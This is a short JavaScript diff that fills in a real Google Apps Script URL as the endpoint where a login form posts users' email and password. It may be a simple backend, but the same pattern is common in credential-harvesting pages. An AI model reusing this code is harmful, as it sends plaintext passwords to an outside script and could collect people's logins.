@@ -63,7 +63,7 @@
       const email = document.getElementById("email").value.trim();
       const password = document.getElementById("password").value.trim();
 
-      const res = await fetch("YOUR_APPS_SCRIPT_URL", {
+      const res = await fetch("https://script.google.com/macros/s/AKfycbyp3XG35Vf0_JbxzQ39_HNQYfUJIpwBNl5PGZZLKv_7nkMiQc6aadFIVio6vjYozBwz/exec", {
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
         body: new URLSearchParams({ email, password })
